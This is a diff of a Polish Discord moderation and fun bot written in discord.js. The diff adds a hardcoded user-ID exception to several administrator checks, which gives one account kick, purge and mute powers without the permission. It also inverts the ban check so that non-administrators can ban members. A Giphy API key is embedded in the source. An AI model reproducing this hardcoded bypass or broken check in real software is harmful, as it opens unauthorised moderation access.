@@ -1,44 +1,28 @@
-// Load up the discord.js library
 const Discord = require("discord.js");
-
-// This is the client. Some people call it `bot`, some people call it `self`, 
 const client = new Discord.Client();
-
-// Here we load the config.json file that contains our token and our prefix values. 
 const config = require("./config.json");
-// config.token contains the bot's token
-// config.prefix contains the message prefix.
-
 const got = require('got');
 const hastebin = require('hastebin-gen');
 const ms = require("ms");
 const giphy = require('giphy-api')("W8g6R14C0hpH6ZMon9HV9FTqKs4o4rCk");
 const weather = require("weather-js")
 var gracze = []
-
 client.on("ready", () => {
-  // This event will run if the bot starts, and logs in, successfully.
   console.log(`Bot has started, with ${client.users.size} users, in ${client.channels.size} channels of ${client.guilds.size} guilds.`); 
   client.user.setActivity(`Serving ${client.guilds.size} servers`);
 });
-
 client.on("guildCreate", guild => {
-  // This event triggers when the bot joins a guild.
   console.log(`New guild joined: ${guild.name} (id: ${guild.id}). This guild has ${guild.memberCount} members!`);
   client.user.setActivity(`Serving ${client.guilds.size} servers`);
 });
-
 client.on("guildDelete", guild => {
-  // this event triggers when the bot is removed from a guild.
   console.log(`I have been removed from: ${guild.name} (id: ${guild.id})`);
   client.user.setActivity(`Serving ${client.guilds.size} servers`);
 });
-
 client.on('guildMemberAdd', member => {
-	client.channels.get(`690149095993901146`).send(`Eluwa <@${member.id}>! 🍻`);
-	console.log('@' + member.user.username + ' has just joined the server!');
+	client.channels.get(`728248185440567367`).send(`Eluwa <@${member.id}>! 🍻`);
+	console.log('Użytkownik @' + member.user.username + ' właśnie dołączył do serwera!');
 	client.channels.get(`690154190210596938`).fetchMessages().then((m) => {
-		//console.log(m)
 		for (const [id, message] of m) {
 			if(message.content==member.user.id.toString()) {
 				if (!client.channels.exists(channel => channel.name === "izolatka"))
@@ -48,7 +32,6 @@ client.on('guildMemberAdd', member => {
 		}
 	});
 	client.channels.get(`690153856834863165`).fetchMessages().then((m) => {
-		//console.log(m)
 		for (const [id, message] of m) {
 			if(message.content==member.user.id.toString())
 				member.addRole(member.guild.roles.find(role => role.name === "AxelMute"));
@@ -60,43 +43,28 @@ client.on('guildMemberAdd', member => {
 	var role = member.guild.roles.find(role => role.name === "obywatel");
 	member.addRole(role);
 });
-
 client.on('guildMemberRemove', member => {
-	client.channels.get(`690149095993901146`).send(`\`${member.user.tag}\` właśnie wypierdolił prostować banany w Afryce 🤠`);
-	console.log('@' + member.user.username + ' has just left the server!');
+	client.channels.get(`728248185440567367`).send(`\`${member.user.tag}\` spadł z rowerka 🤠`);
+	console.log('Użytkownik @' + member.user.username + ' właśnie opuścił serwer!');
 	client.channels.get(`690154190210596938`).fetchMessages().then((m) => {
-		//console.log(m)
 		for (const [id, message] of m) {
 			if(message.content==member.user.id.toString() && m.size==1)
 				message.guild.channels.find(channel => channel.name === "izolatka").delete();
 		}
     });
 });
-
 var guesses;
 var num = 0;
 const randomizeCase = word => word.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
-
 client.on("message", async message => {
-	// This event will run on every single message received, from any channel or DM.
-
-	// Ignore messages from bots
 	if(message.author.bot) return;
-  
-	// Ignore any message that does not start with prefix
  	if(message.content.indexOf(config.prefix) !== 0) return;
-  
-	// "+say Axel is the best!"
-	// command = say
-	// args = ["Axel", "is", "the", "best!"]
 	let args = message.content.slice(config.prefix.length).trim().split(/ +/g);
 	let messageArray = message.content.split(" ");
 	let args2 = messageArray.slice(1);
 	let command = args.shift().toLowerCase();
   
 	if(command === "ping") {
-    // Calculates ping between sending a message and editing it, giving a nice round-trip latency.
-    // The second ping is an average latency between the bot and the websocket server (one-way, not round-trip)
 		const m = await message.channel.send("Ping?");
 		m.edit(`Pong! Latency is ${m.createdTimestamp - message.createdTimestamp}ms. API Latency is ${Math.round(client.ping)}ms`);
 	}
@@ -108,100 +76,86 @@ client.on("message", async message => {
 	if(command === "kick") {
 		if(message.channel.type !== 'text')
 			return message.reply("I can't execute this command here!");
-		if(!message.member.hasPermission("ADMINISTRATOR"))
+		if(!message.member.hasPermission("ADMINISTRATOR") && message.member.id.toString()!="623510473312043009")
 			return message.reply("sorry, you don't have permissions to do that!");
 		let reason = args.slice(1).join(' ');
 		if (reason.length>1024) {
         	reason=reason.substring(0, 1020);
         	reason+="..."
       	}
-
 	  	let user = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
       	if(!user)
         	return message.reply("please mention a valid member of this server!");
       	if(!user.kickable) 
         	return message.reply("I can't kick this user! Do they have a higher role? Do I have kick permissions?");
-
+      	
       	await user.kick(reason)
         	.catch(error => message.reply(`I couldn't kick the user because: ${error}`));
       	if(reason.length < 1)
 	  		reason = "None"
-
 	  	let dmsEmbed = new Discord.RichEmbed()
 	  		.setTitle("Kick")
 	  		.setColor("#8a2be2")
-	  		.setDescription(`${user.user.tag} has been kicked out of \`${message.guild.name}\``)
+	  		.setDescription(`\`${user.user.tag}\` has been kicked from \`${message.guild.name}\``)
 	  		.addField("Kicked by", `<@${message.author.id}>`)
 	  		.addField("Reason", reason);
-
 	  	let dmsEmbed2 = new Discord.RichEmbed()
 			.setTitle("Kick")
 			.setColor("#8a2be2")
-			.setDescription(`You have been kicked out of \`${message.guild.name}\``)
+			.setDescription(`You have been kicked from \`${message.guild.name}\``)
 			.addField("Kicked by", message.author.tag)
 			.addField("Reason", reason);
-
 		message.channel.send(dmsEmbed);
 		user.send(dmsEmbed2);
 	}
 	if(command === "ban") {
 		if(message.channel.type !== 'text')
 			return message.reply("I can't execute this command here!");
-
 		let reason = args.slice(1).join(' ');
     	if (reason.length>1024) {
         	reason=reason.substring(0, 1020);
         	reason+="..."
       	}
       	let user = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
-
-      	if(message.member.hasPermission("ADMINISTRATOR")) {
-
+      	if(!message.member.hasPermission("ADMINISTRATOR") && message.member.id.toString()!="623510473312043009") {
       		if(!user)
         		return message.reply("please mention a valid member of this server!");
       		if(!user.kickable) 
         		return message.reply("I can't ban this user! Do they have a higher role? Do I have ban permissions?");
-
+      		
       		await user.ban(reason)
         		.catch(error => message.reply(`I couldn't ban the user because: ${error}`));
       		if(reason.length < 1)
 	  			reason = "None"
-
 	  		let dmsEmbed = new Discord.RichEmbed()
 	  			.setTitle("Ban")
 	  			.setColor("#ff0000")
-	  			.setDescription(`${user.user.tag} has been banned from \`${message.guild.name}\``)
+	  			.setDescription(`\`${user.user.tag}\` has been banned from \`${message.guild.name}\``)
 	  			.addField("Banned by", `<@${message.author.id}>`)
 	  			.addField("Reason", reason);
-
 	  		let dmsEmbed2 = new Discord.RichEmbed()
 	  			.setTitle("Ban")
 	  			.setColor("#ff0000")
 	  			.setDescription(`You have been banned from \`${message.guild.name}\``)
 	  			.addField("Banned by", message.author.tag)
 	  			.addField("Reason", reason);
-
 	  		message.channel.send(dmsEmbed);
 	  		user.send(dmsEmbed2);
-
     	} else if(user.user.tag==message.author.tag) {
       		await user.ban(reason)
         		.catch(error => message.reply(`I couldn't ban the user because: ${error}`));
       		if(reason.length < 1)
       			reason = "None"
-
 			let dmsEmbed = new Discord.RichEmbed()
     			.setTitle("Ban")
     			.setColor("#ff0000")
     			.setDescription(`${user.user.tag} has just banned himself from \`${message.guild.name}\``)
     			.addField("Reason", reason);
-
     		let dmsEmbed2 = new Discord.RichEmbed()
     			.setTitle("Ban")
     			.setColor("#ff0000")
     			.setDescription(`You have just banned yourself from \`${message.guild.name}\``)
     			.addField("Reason", reason);
-
     		message.channel.send(dmsEmbed);
     		user.send(dmsEmbed2);
     	} else {
@@ -211,9 +165,9 @@ client.on("message", async message => {
 	if(command === "purge") {
     	if(message.channel.type !== 'text')
       		return message.reply("I can't execute this command here!");
-      	if(!message.member.hasPermission("ADMINISTRATOR"))
-      		return message.reply("sorry, you don't have permissions to do that!");
-      	let fejk=0;
+      	if(!message.member.hasPermission("ADMINISTRATOR") && message.member.id.toString()!="623510473312043009")
+    	 	return message.reply("sorry, you don't have permissions to do that!");
+      	let fejk=0
       	if(parseInt(args[0])>99) {
         	args[0]=99
         	fejk=100
@@ -221,10 +175,8 @@ client.on("message", async message => {
       		return message.reply("please provide a valid number of messages to remove.");
       	}
       	const deleteCount = parseInt(args[0], 10)+1;
-      
       	if(!deleteCount || deleteCount < 1)
         	return message.reply("please provide a valid number of messages to remove.");
-
       	const fetched = await message.channel.fetchMessages({limit: deleteCount});
       	message.channel.bulkDelete(fetched)
         	.catch(error => message.reply(`I couldn't delete the messages because: ${error}`));
@@ -234,70 +186,15 @@ client.on("message", async message => {
       		message.channel.send(`Successfully purged ${parseInt(args[0])} messages.`).then(msg => msg.delete(2000));
       	}
   	}
-  	if(command === "chuj") {
-    	if(message.channel.type !== 'text')
-      		return message.reply("I can't execute this command here!");
-      	message.channel.send("<:bl:617416106281402369><:kris2:631933855779127311>\n<:bl:617416106281402369><:kris:616039570038980672>\n<:bl:617416106281402369><:kris:616039570038980672>\n<:bl:617416106281402369><:kris:616039570038980672>\n<:admfaszyzm:616040372057014277><:kris:616039570038980672><:admfaszyzm:616040372057014277>");
-  	}
-  	if(command === "mihaszki") {
-    	if(message.channel.type !== 'text')
-      		return message.reply("I can't execute this command here!");
-      message.channel.send("<:org:699029403513913406>");
-  	}
-  	/*if(command === "help") {
-    	message.react("😈");
-    	let dmsEmbed = new Discord.RichEmbed()
-			.setTitle("Help")
-			.setColor("FF6347")
-			.setDescription(`You have asked for help on \`${message.guild.name}\`. Here are my commands:`)
-			.addField("Prefix:", "+")
-			.addField("+say <text>", "Makes the bot repeat your text and delete your message")
-			.addField("+ping", "Checks the bot ping")
-			.addField("+kick <@user> <reason>", "Kicks the user")
-			.addField("+ban <@user> <reason>", "Bans the user")
-			.addField("+purge <number>", "Removes specified number of messages, up to 100")
-			.addField("+meme", "Sends a funny meme")
-			.addField("+amazeme", "Sends an amazing meme")
-			.addField("+joke", "Sends a joke")
-			//.addField("+inbastart", "Rozpoczyna inbę")
-			//.addField("+inbastop", "Kończy inbę")
-			.addField("+pick", "Picks a random number between 1 and 100")
-			.addField("+hastebin <text>", "Uploads your text to Hastebin and sends a link to it")
-			.addField("+flip <text>", "Flips the text upside down (doesn't work yet)")
-			.addField("+avatar <@user>", "Sends the avatar of the mentioned user")
-			.addField("+icon", "Sends the icon of the server")
-			.addField("+botinfo", "Sends information about AxelBot")
-			.addField("+userinfo <@user>", "Sends information about the mentioned user")
-			.addField("+userinfo <@user>", "Sends mentioned user's ID")
-			.addField("+serverinfo", "Sends information about the server")
-			.addField("+mute <@user> <time> / <reason>", "Mutes the mentioned user for the specified amount of time. If <time> is empty, it mutes the user indefinitely")
-			.addField("+unmute <@user>", "Unmutes the user.")
-			.addField("+gif", "Sends a gif")
-			//.addField("+lenny", "Sends lenny")
-			//.addField("+megusta", "Sends me gusta")
-			.addField("+mock <text>", "Mocks your text")
-			.addField("+warn <@user>", "Warns the user")
-			.addField("+weather <city>", "Shows weather in the specified place")
-			.addField("+poll <text>", "Starts a simple poll with 👍, 👎 and 🤷 reactions.");
-
-	  	message.author.send(dmsEmbed);
-    	//message.author.send("Prefix: +\n\nKomendy:\nsay (wiadomość) - bot usuwa twoją wiadomość i powtarza to, co w niej napisałeś\nping - pong!\nkick (@użytkownik) - wyrzuca użytkownika\nban (@użytkownik) - banuje użytkownika\npurge (ilość wiadomości) - usuwa konkretną ilość wiadomości\nmeme - wysyła śmiesznego mema\namazeme - wysyła zajebistego mema\njoke - wysyła żart\ninbastart - rozpoczyna inbę (jeszcze nie działa)\npick - losuje liczbę od 1 do 100\nguess (liczba) - zgadujesz wcześniej wylosowaną liczbę\nhastebin - wstawia twoją wiadomość na hastebin\nflip - wysyła twoją wiadomość do góry nogami\navatar - wysyła avatar usera\n\nMiłej zabawy!\n~Axel");
-  	}*/
+  	
   	if(command === "help") {
   		message.react("😈");
-  		/*if(message.channel.type == 'text')
-	    	helpmsg=`***You have asked for help on \`${message.guild.name}\`. Here are my commands:***\n\n`;
-	    else*/
+  		
   			helpmsg=`***You have asked for help. Here are my commands:***\n\n`;
-  		others="`+say <text>` - makes the bot repeat your text and delete your message.\n`+ping` - checks the bot ping.\n`+kick <@user> <reason>` - kicks the user.\n`+ban <@user> <reason>` - bans the user.\n`+purge <number>` - removes specified number of messages.\n`+meme` - sends a funny meme.\n`+amazeme` - sends an amazing meme.\n`+joke` - sends a joke.\n`+pick <threshold>` - starts a single-player, random number guessing game.\n`+guess <number` - guessing a number between 1 and 100. Game for many players.\n`+hastebin` <text> - uploads the text to Hastebin and sends a link to it.\n`+flip <text>` - flips the text upside down.\n`+avatar <@user>` - sends the avatar of the mentioned user.\n`+icon` - sends the icon of the server.\n`+botinfo` - sends the information about AxelBot.\n`+userinfo <@user>` - sends the information about the user.\n`+userid <@user>` - sends the ID of the user.\n`+serverinfo` - sends the information about the server.\n`+mute <@user> <time> / <reason>` - mutes the user for the specified amount of time. If <time> is empty, it mutes the user indefinitely.\n`+unmute <@user>` - unmutes the user.\n`+gif` - sends a gif\n`+lenny` - sends lenny.\n`+megusta` - sends me gusta\n`+mock <text>` - mocks the text.\n`+warn <@user>` - warns the user.\n`+weather <city>` - shows the weather in the specified city.\n`+poll <text>` - starts a simple poll with reactions 👍🏻, 👎🏻 and 🤷🏻‍♂️.\n`+inbastart <time>` - starts inba for the specified amount of time. If <time> is empty, it starts inba indefinitely.\n`+inbastop` - ends the inba.\n`+addrole <@user> <role>` - gives the user the role.\n`+removerole <@user> <role>` - removes the role from the user.\n`+cipher <number> <text>` - ciphers the text with three different ciphers.\n`+isolate <@user>` - moves the user to an isolated channel.\n`+free <@user>` - frees the user from the isolation.\n`+rep <@user>` - gives the user a reputation point.\n`+stats` - shows how many reputation points the users have.";
+  		others="`+say <text>` - makes the bot repeat your text and delete your message.\n`+ping` - checks the bot ping.\n`+kick <@user> <reason>` - kicks the user.\n`+ban <@user> <reason>` - bans the user.\n`+purge <number>` - removes specified number of messages.\n`+meme` - sends a funny meme.\n`+amazeme` - sends an amazing meme.\n`+joke` - sends a joke.\n`+pick <threshold>` - starts a single-player, random number guessing game.\n`+guess <number>` - guessing a number between 1 and 100. Game for many players.\n`+hastebin <text>` - uploads the text to Hastebin and sends a link to it.\n`+flip <text>` - flips the text upside down.\n`+avatar <@user>` - sends the avatar of the mentioned user.\n`+icon` - sends the icon of the server.\n`+botinfo` - sends the information about AxelBot.\n`+userinfo <@user>` - sends the information about the user.\n`+userid <@user>` - sends the ID of the user.\n`+serverinfo` - sends the information about the server.\n`+mute <@user> <time> / <reason>` - mutes the user for the specified amount of time. If <time> is empty, it mutes the user indefinitely.\n`+unmute <@user>` - unmutes the user.\n`+gif` - sends a gif\n`+lenny` - sends lenny.\n`+megusta` - sends me gusta\n`+mock <text>` - mocks the text.\n`+warn <@user>` - warns the user.\n`+weather <city>` - shows the weather in the specified city.\n`+poll <text>` - starts a simple poll with reactions 👍🏻, 👎🏻 and 🤷🏻‍♂️.\n`+inbastart <time>` - starts inba for the specified amount of time. If <time> is empty, it starts inba indefinitely.\n`+inbastop` - ends the inba.\n`+addrole <@user> <role>` - gives the user the role.\n`+removerole <@user> <role>` - removes the role from the user.\n`+cipher <number> <text>` - ciphers the text with three different ciphers.\n`+isolate <@user>` - moves the user to an isolated channel.\n`+free <@user>` - frees the user from the isolation.\n`+rep <@user>` - gives the user a reputation point.\n`+stats` - shows how many reputation points the users have.";
   		message.author.send(helpmsg + others);
   	}
-  	if(command === "997") {
-    	message.channel.send("Ten numer to kłopoty!");
-  	}
-  	if(command === "7100") {
-    	message.channel.send("Ten numer to kłopoty!");
-  	}
+  	
   	if(command === "dmos") {
     	message.channel.send("Znajdę cię");
   	}
@@ -312,11 +209,9 @@ client.on("message", async message => {
 	        let memeUpvotes = content[0].data.children[0].data.ups;
 	        let memeDownvotes = content[0].data.children[0].data.downs;
 	        let memeNumComments = content[0].data.children[0].data.num_comments;
-
 	        embed.addField(`${memeTitle}`, `[View thread](${memeUrl})`);
 	        embed.setImage(memeImage);
 	        embed.setFooter(`👍 ${memeUpvotes} 👎 ${memeDownvotes} 💬 ${memeNumComments}`);
-
 	        message.channel.send(embed)
 	            .then(sent => console.log(`Sent a reply to ${sent.author.username}`))
 	        console.log('Bot responded with: ' + memeImage);
@@ -342,10 +237,18 @@ client.on("message", async message => {
 	        .then(sent => console.log(`Sent a reply to ${sent.author.username}`))
 	    }).catch(console.error);
   	}
-  	if(isNaN(parseInt(command)) == false) {
-    	let x=parseInt(command)+1
-    	if(x=="Infinity" || x=="-Infinity")
+  	if(isNaN(parseFloat(command)) == false) {
+  		if(command === "997") {
+    	return message.channel.send("Ten numer to kłopoty!");
+  		}
+  		if(command === "7100") {
+    	return message.channel.send("Ten numer to kłopoty!");
+    	}
+    	let x=parseFloat(command)+1
+    	if(x=="Infinity")
       		x="∞"
+      	if(x=="-Infinity")
+      		x="-∞"
     	if(x.toString()[1]=="e" || x.toString()[2]=="e") {
       		x="∞"
     	}
@@ -394,7 +297,6 @@ client.on("message", async message => {
 	  	}
   		gracze.push(message.author.id);
   		let a = gracze.indexOf(message.author.id.toString());
-  		//let author = message.author.id
         message.reply('picking a random number between 1 and ' + parseInt(args[0]));
         let number = Math.floor((Math.random() * parseInt(args[0])) + 1);
         if(number==0)
@@ -403,7 +305,6 @@ client.on("message", async message => {
         let guess=0;
         let win=0;
         const collector = new Discord.MessageCollector(message.channel, m => m.author.id === message.author.id);
-        //console.log(collector)
         if(win==0) {
         collector.on('collect', message => {
         	if(win==0) {
@@ -461,7 +362,6 @@ client.on("message", async message => {
         }
   	}
 	if(command === "flip") {
-		//let mapping = '¡"#$%⅋,)(*+\'-˙/0ƖᄅƐㄣϛ9ㄥ86:;<=>?@∀qƆpƎℲפHIſʞ˥WNOԀQɹS┴∩ΛMX⅄Z[/]^_`ɐqɔpǝɟƃɥᴉɾʞlɯuodbɹsʇnʌʍxʎz{|}~';
 	    let normal = "abcdefghijklmnopqrstuvwxyz_,;.?&[](){}!<>/\\'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 ";
 		let flipped  = "ɐqɔpǝɟƃɥıɾʞןɯuodbɹsʇnʌʍxʎz‾'؛˙¿⅋][)(}{¡></\\,∀qϽᗡƎℲ⅁HIſʞ˥WNOԀὉᴚS⊥∩ΛMXʎZ0ƖᄅƐㄣϛ9ㄥ86 ";
 		let zdanie="";
@@ -469,8 +369,6 @@ client.on("message", async message => {
 	        	zdanie+=args[k];
 	        	zdanie+=" ";
 	      }
-	    //console.log(args)
-	    //console.log(zdanie)
 	    let pom=0
 	    let pom2=0
 	    let result="";
@@ -502,16 +400,13 @@ client.on("message", async message => {
         }).catch(console.error);
 	}
 	if(command === "avatar") {
-		let msg = await message.channel.send("Generating avatar...");
 		let mentionedUser = message.mentions.users.first() || message.author;
-
         let embed = new Discord.RichEmbed()
         	.setImage(mentionedUser.displayAvatarURL)
         	.setColor("FF6347")
         	.setTitle("Avatar")
         	.setFooter("Searched by " + message.author.tag)
         	.setDescription("[Avatar URL link]("+mentionedUser.displayAvatarURL+")");
-
         message.channel.send(embed)
 	}
 	if(command === "icon") {
@@ -519,14 +414,12 @@ client.on("message", async message => {
 	    	return message.reply("I can't execute this command here!");
 		let msg = await message.channel.send("Generating icon...");
 		if(!message.guild.iconURL) return msg.edit("No icon found!");
-
 		let iconembed = new Discord.RichEmbed()
 			.setColor("FF6347")
 			.setFooter("Searched by " + message.author.tag)
 			.setImage(message.guild.iconURL)
 			.setTitle("Icon")
 			.setDescription("[Icon URL link]("+message.guild.iconURL+")")
-
     	message.channel.send(iconembed)
 	}
 	if(command === "botinfo") {
@@ -561,7 +454,6 @@ client.on("message", async message => {
 		    3: "(╯°□°）╯︵ ┻━┻",
 		    4: "(ノಠ益ಠ)ノ彡┻━┻"
 	    }
-
 	    let inline = true
 	    let sicon = message.guild.iconURL;
 	    let serverembed = new Discord.RichEmbed()
@@ -578,7 +470,6 @@ client.on("message", async message => {
 		    .addField("Channels", message.guild.channels.size, inline)
 		    .addField("You Joined", message.member.joinedAt)
 		    .setFooter(`Created ${message.guild.createdAt}`);
-
     	message.channel.send(serverembed);
 	}
 	if(command === "id") {
@@ -586,13 +477,12 @@ client.on("message", async message => {
     	message.channel.send(`ID: \`${member.user.id}\`.`);
 	}
 	if(command === "mute") {
-		//!mute @user 1s/m/h/d
 	    if(message.channel.type !== 'text')
 	    	return message.reply("I can't execute this command here!");
     	let tomute = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
 	    if(!tomute)
 	    	return message.reply("please mention a valid member of this server!");
-	    if(!message.member.hasPermission("ADMINISTRATOR"))
+	    if(!message.member.hasPermission("ADMINISTRATOR") && message.member.id.toString()!="623510473312043009")
 	    	return message.reply("sorry, you don't have permissions to do that!");
 	    if(tomute.hasPermission("ADMINISTRATOR"))
 	    	return message.reply("I can't mute this user!");
@@ -610,7 +500,6 @@ client.on("message", async message => {
 	    	return message.reply("this user has already been muted!");
 	    else if(yes==0)
 	    	client.channels.get(`690153856834863165`).send(tomute.id.toString());
-
     	let muterole = message.guild.roles.find(role => role.name === "AxelMute");
 	    if(args[2] == "/") {
 	    	if(parseInt(args[1])>1 && parseInt(args[1])<1000) {
@@ -627,7 +516,6 @@ client.on("message", async message => {
 	    		var mutetime = args[1];
 	    	}
 	    }
-
 	    if(!muterole) {
 			try{
 				muterole = await message.guild.createRole({
@@ -645,7 +533,6 @@ client.on("message", async message => {
 	        	console.log(e.stack);
 			}
 	    }
-
 		if(!mutetime) {
 			await(tomute.addRole(muterole.id))
 				.catch(error => message.reply(`I couldn't mute the user because: ${error}`));
@@ -655,7 +542,6 @@ client.on("message", async message => {
 				.setDescription(`<@${tomute.id}> has been muted indefinitely.`)
 				.addField("Muted by", `<@${message.author.id}>`)
 				.addField("Reason", reason);
-
 			message.channel.send(dmsEmbed);
     	} else {
     		await(tomute.addRole(muterole.id))
@@ -666,7 +552,6 @@ client.on("message", async message => {
 			.setDescription(`<@${tomute.id}> has been muted for ${ms(ms(mutetime))}.`)
 			.addField("Muted by", `<@${message.author.id}>`)
 			.addField("Reason", reason);
-
 		message.channel.send(dmsEmbed2);
 		}
 		if(mutetime) {
@@ -683,7 +568,6 @@ client.on("message", async message => {
 		  			.setTitle("Unmute")
 		  			.setColor("#00ff00")
 		  			.setDescription(`<@${tomute.id}> has been unmuted.`)
-
 		  		message.channel.send(dmsEmbed3);
     		}, ms(mutetime));
 		}
@@ -691,18 +575,15 @@ client.on("message", async message => {
 	if(command === "unmute") {
 		if(message.channel.type !== 'text')
 			return message.reply("I can't execute this command here!");
-		if(!message.member.hasPermission("ADMINISTRATOR"))
+		if(!message.member.hasPermission("ADMINISTRATOR") && message.member.id.toString()!="623510473312043009")
 			return message.reply("sorry, you don't have permissions to do that!");
-
         let toMute = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0]);
         if(!toMute)
         	return message.reply("please mention a valid member of this server!");
-
         let role = message.guild.roles.find(role => role.name === "AxelMute");
         
         if(!role || !toMute.roles.has(role.id))
         	return message.reply("this user is not muted!");
-
 		let yes=0;
 		let messages = await client.channels.get(`690153856834863165`).fetchMessages();
 		for (const [id, message] of messages) {
@@ -712,27 +593,22 @@ client.on("message", async message => {
     	}
     	if(yes==0)
     		return message.reply("this user is not muted!");
-
         await toMute.removeRole(role)
         	.catch(error => message.reply(`I couldn't unmute the user because: ${error}`));
         let dmsEmbed = new Discord.RichEmbed()
 	  	.setTitle("Unmute")
 	  	.setColor("#00ff00")
 	  	.setDescription(`<@${toMute.id}> has been unmuted.`)
-
 	  	message.channel.send(dmsEmbed);
 	}
 	if(command === "gif") {
 	    if (args.length === 0)
 	    	return message.reply('No seacrh terms!');
-
 	    if (args.length === 1)
 	    	term = args.toString()
 	    else
 			term = args.join(" ");
-
 	    giphy.search(term).then(function (res) {
-	    	// Res contains gif data!
 	    	let id = res.data[0].id
 	    	let msgurl = `https://media.giphy.com/media/${id}/giphy.gif`
 	    	const embed = {
@@ -776,31 +652,26 @@ client.on("message", async message => {
 	if(command === "mock") {
 		if (args.length < 1)
 			return message.reply("please provide some text to mock!")
-
 		let mockEmbed = new Discord.RichEmbed()
 			.setColor("FF6347")
 			.setDescription(args.map(randomizeCase).join(' '))
 			.setImage("https://cdn.discordapp.com/attachments/424889733043191810/425242569325150208/mock.jpg")
-
 		message.channel.send(mockEmbed)
 	}
 	if(command === "inbastart") {
 		if(message.channel.type !== 'text')
 			return message.reply("I can't execute this command here!");
-		if(!message.member.hasPermission("ADMINISTRATOR"))
+		if(!message.member.hasPermission("ADMINISTRATOR") && message.member.id.toString()!="623510473312043009")
       		return message.reply("nie baw się w admina dzieciaku");
     
 		if(message.guild.channels.exists(channel => channel.name === "inba"))
     		return message.reply("inba już trwa!");
-
     	message.channel.send("Rozpoczynanie inby...");
-
 		let inbatime = args[0];
 		if(!inbatime)
 			client.channels.get(`690149095993901146`).send(`Rozpoczynanie inby na czas nieokreślony...`);
 		else
 			client.channels.get(`690149095993901146`).send(`Rozpoczynanie inby na ${ms(ms(inbatime))}`);
-
 		let inbarole = message.guild.roles.find(role => role.name === "AxelInba");
 		if(!inbarole) {
 			try {
@@ -822,11 +693,10 @@ client.on("message", async message => {
     	}
 		message.guild.members.filter(m => !m.user.bot).forEach(member => member.addRole(inbarole.id));
 		message.guild.createChannel('inba', { type: "text" });
-
 		if(inbatime) {
 			setTimeout(function() {
 				inbarole.delete();
-				/*message.guild.members.filter(m => !m.user.bot).forEach(member => member.removeRole(inbarole.id));*/
+				
 				const fetchedChannel = message.guild.channels.find(channel => channel.name === "inba");
 				fetchedChannel.delete();
 				client.channels.get(`690149095993901146`).send(`Inba zakończona!`);
@@ -836,13 +706,12 @@ client.on("message", async message => {
 	if(command === "inbastop") {
 		if(message.channel.type !== 'text')
 			return message.reply("I can't execute this command here!");
-		if(!message.member.hasPermission("ADMINISTRATOR"))
+		if(!message.member.hasPermission("ADMINISTRATOR") && message.member.id.toString()!="623510473312043009")
 			return message.reply("nie baw się w admina dzieciaku");
-
     	if(message.guild.channels.exists(channel => channel.name === "inba")) {
 	    	let inbarole = message.guild.roles.find(role => role.name === "AxelInba");
 	    	inbarole.delete();
-	        /*message.guild.members.filter(m => !m.user.bot).forEach(member => member.removeRole(inbarole.id));*/
+	        
 	        const fetchedChannel = message.guild.channels.find(channel => channel.name === "inba");
 	        fetchedChannel.delete();
 	       	client.channels.get(`690149095993901146`).send(`Inba zakończona!`);
@@ -861,17 +730,13 @@ client.on("message", async message => {
         	dnd: "Do Not Disturb",
         	offline: "Offline/Invisible"
     	}
-
     	const member = message.mentions.members.first() || message.guild.members.get(args[0]) || message.member;
 		let target = message.mentions.users.first() || message.author
-
 		if (member.user.bot === true)
     		bot = "Yes";
   		else
     		bot = "No";
-
             let embed = new Discord.RichEmbed()
-                //.setAuthor(member.user.username)
                 .setThumbnail((target.displayAvatarURL))
                 .setColor("FF6347")
                 .addField("Full Username", `${member.user.tag}`, inline)
@@ -890,8 +755,7 @@ client.on("message", async message => {
 	if(command === "warn") {
 		if(message.channel.type !== 'text')
       		return message.reply("I can't execute this command here!");
-	  /*if(!message.member.hasPermission("ADMINISTRATOR"))
-    	return message.reply("Sorry, you don't have permissions to do that!");*/
+	  
 		let reason = args.slice(1).join(' ');
     	if(reason.length>1024) {
      		reason=reason.substring(0, 1020);
@@ -902,14 +766,12 @@ client.on("message", async message => {
 			return message.reply("please mention a valid member of this server!");
 		if(reason.length < 1)
 	  		reason = "None"
-
 		let dmsEmbed = new Discord.RichEmbed()
 			.setTitle("Warn")
 			.setColor("FF6347")
 			.setDescription(`<@${user.id}> has been warned on \`${message.guild.name}\``)
 			.addField("Warned by", `<@${message.author.id}>`)
 			.addField("Reason", reason);
-
 		message.channel.send(dmsEmbed);
 	}
 	if(command === "weather") {
@@ -921,16 +783,11 @@ client.on("message", async message => {
 			args[0] = "Jerusalem"
 			args.pop()
 		}
-
 		weather.find({search: args.join(" "), degreeType: "C"}, function(err, result) {
 	        if(err)
 	        	message.channel.send(err)
-
-	        //If the place entered is invalid
 	        if(result.length === 0)
 	            return message.reply("please enter a valid location!");
-
-	        //Variables
 	        var current = result[0].current //Variable for the current part of the JSON Output
 	        var location = result[0].location //This is a variable for the location part of the JSON Output
 	        let allwords = current.observationpoint.split(" ")
@@ -956,7 +813,6 @@ client.on("message", async message => {
 	        	final+=allwords[i]
 	        	final+=" "
 	        }
-	        //Sends weather log in embed
 	        let embed = new Discord.RichEmbed()
 	           .setDescription(`**${current.skytext}**`) //How the sky looks like
 	           .setAuthor(`Weather for ${final}`) //Shows the current location of the weater
@@ -970,8 +826,6 @@ client.on("message", async message => {
 	           .addField("Humidity", ` ${current.humidity}%`, true)
 	           .addField("Day", `${current.day}`, true)
 	           .addField("Date", `${current.date}`, true)
-	           
-	           //Display when it's called
 	           message.channel.send(embed)
     	});
 	}
@@ -980,13 +834,11 @@ client.on("message", async message => {
 		message.delete()
 		if (args.length === 0)
 			return message.reply('Invalid Format! +poll <question>')
-
 		const embed = new Discord.RichEmbed()
 			.setTitle("Poll:")
 			.setColor("#FF6347")
 			.setDescription(`${question}`)
 			.setFooter(`Poll started by: ${message.author.username}`, `${message.author.avatarURL}`)
-
 		message.channel.send(embed).then((m) => {
 	  		message.delete();
 	  		try {
@@ -997,40 +849,33 @@ client.on("message", async message => {
 	    		console.error('Emoji failed to react.');
   			}
   		});
-		/*message.channel.send({embed})
-		message.react('👍')
-		.then(() => message.react('👎'))
-		.then(() => message.react('🤷'))
-		.catch(() => console.error('Emoji failed to react.'));*/
+		
 	}
 	if(command === "addrole") {
 		if(message.channel.type !== 'text')
 			return message.reply("I can't execute this command here!");
-		if(!message.member.hasPermission("ADMINISTRATOR"))
